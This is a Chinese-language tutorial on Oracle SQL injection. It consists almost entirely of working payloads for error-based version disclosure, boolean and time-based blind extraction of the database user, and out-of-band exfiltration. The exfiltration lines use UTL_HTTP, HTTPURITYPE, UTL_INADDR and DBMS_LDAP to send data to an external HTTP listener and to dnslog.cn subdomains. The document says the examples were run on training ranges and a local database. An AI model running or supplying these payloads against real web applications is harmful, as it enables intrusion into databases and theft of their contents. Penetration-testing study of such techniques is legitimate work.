# Oracle 数据库注入技术详解

## 1. 获取数据库版本信息
- **dbms_xdb_version.checkin()**
  ```sql
  ?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --
  ```

- **dbms_xdb_version.makeversioned()**
  ```sql
  ?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --
  ```

- **dbms_xdb_version.uncheckout()**
  ```sql
  ?id=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null --
  ```

- **dbms_utility.sqlid_to_sqlhash()**
  ```sql
  ?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null --
  ```

- **ordsys.ord_dicom.getmappingxpath()**
  ```sql
  ?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)--
  ```

- **utl_inaddr.get_host_name() 和 utl_inaddr.get_host_address()**
  ```sql
  ?id=1 and 1=utl_inaddr.get_host_name((select user from dual)) --
  ?id=1 and 1=utl_inaddr.get_host_address((select user from dual)) --
  ```

## 2. 布尔型盲注
### 2.1 猜解长度和字符
- **猜解用户名长度**
  ```sql
  ?id=1 and 6=(select length(user) from dual)--
  ```

- **猜解用户名字符的ASCII码**
  ```sql
  ?id=1 and (select ascii(substr(user,1,1)) from dual)>83
  ?id=1 and (select ascii(substr(user,1,1)) from dual)=83
  ```

### 2.2 使用 `DECODE` 函数进行布尔盲注
- **测试用户名长度**
  ```sql
  http://219.153.49.228:44768/new_list.php?id=1 and 6=(select length(user) from dual) --
  ```

- **测试当前用户是否为 SYSTEM**
  ```sql
  http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(user,'SYSTEM',1,0) from dual) --
  ```

- **逐个字符猜解用户名**
  ```sql
  http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,1,1),'S',1,0) from dual) --
  http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,2,1),'Y',1,0) from dual) --
  http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,3,1),'S',1,0) from dual) --
  http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,4,1),'T',1,0) from dual) --
  http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,5,1),'E',1,0) from dual) --
  http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,6,1),'M',1,0) from dual) --
  ```

- **使用 ASCII 码猜解用户名**
  ```sql
  http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',1,0) from dual) --
  ```

### 2.3 使用 `INSTR` 函数进行布尔盲注
- **示例**
  ```sql
  select instr('abcdefgh','de') position from dual; -- 返回结果：4
  ```

- **应用**
  ```sql
  http://219.153.49.228:44768/new_list.php?id=1 and 1=(instr((select user from dual),'SYS')) --
  http://219.153.49.228:44768/new_list.php?id=1 and 4=(instr((select user from dual),'T')) --
  ```

## 3. 延时盲注
### 3.1 检测漏洞存在
- **DBMS_PIPE.RECEIVE_MESSAGE** 函数
  ```sql
  DBMS_PIPE.RECEIVE_MESSAGE('pipename', timeout)
  ```
  - **pipename**: 指定管道名称，可以是任意值。
  - **timeout**: 可选参数，指定等待时间。

- **示例**
  ```sql
  http://219.153.49.228:44768/new_list.php?id=1 and 1=dbms_pipe.receive_message('o', 10)--
  ```

### 3.2 配合 `DECODE` 函数延时盲注
- **直接猜解字符**
  ```sql
  ?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('o',5),0) from dual) --
  ```

- **通过 ASCII 码猜解字符**
  ```sql
  ?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',dbms_pipe.receive_message('o',5),0) from dual) --
  ```

### 3.3 使用其他延时查询
- **示例**
  ```sql
  ?id=1 and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) --
  ?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',(select count(*) from all_objects),0) from dual) --
  ```

## 4. 外带数据注入
### 4.1 使用 `UTL_HTTP.REQUEST()` 方法
- **检测支持情况**
  ```sql
  ?id=1 and exists (select count(*) from all_objects where object_name='UTL_HTTP') --
  ```

- **Python 启动 HTTP 服务**
  ```sh
  python3 -m http.server 4455
  ```

- **子查询数据库版本信息并访问 Python 启动的 HTTP 服务**
  ```sql
  ?id=1 and utl_http.request('http://192.168.100.130:4455/'||(select banner from sys.v_$version where rownum=1))=1--
  ```

### 4.2 使用 `UTL_INADDR.GET_HOST_ADDRESS()` 函数
- **示例**
  ```sql
  ?id=1 and (select utl_inaddr.get_host_address((select user from dual)||'.eeaijt.dnslog.cn') from dual) is not null --
  ```

### 4.3 使用 `SYS.DBMS_LDAP.INIT()` 函数
- **示例**
  ```sql
  ?id=1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.51prg6.dnslog.cn',80) from dual) is not null --
  ```

### 4.4 使用 `HTTPURITYPE()` 函数
- **示例**
  ```sql
  ?id=1 and (select HTTPURITYPE('http://192.168.100.130:4455/'||(select user from dual)).GETCLOB() FROM DUAL) is not null --
  ```

## 5. 总结
Oracle 数据库注入与常见的 SQL 注入原理相似，主要通过拼接 SQL 语句来执行。在实际操作中，需要注意数据类型的一致性和常用表名列名的不同。许多企业仍然使用 Oracle 数据库，因此了解这些注入技术对于渗透测试人员非常重要。

以上测试靶场采用墨者学院 Oracle 注入靶场、掌控安全 Oracle 注入靶场以及本地搭建的 Oracle 数据库。在实战中可能会遇到 WAF 等安全设备的拦截，后续将针对 Oracle 数据库 WAF 绕过编写一篇文章，敬请期待。

希望本文对您有所帮助！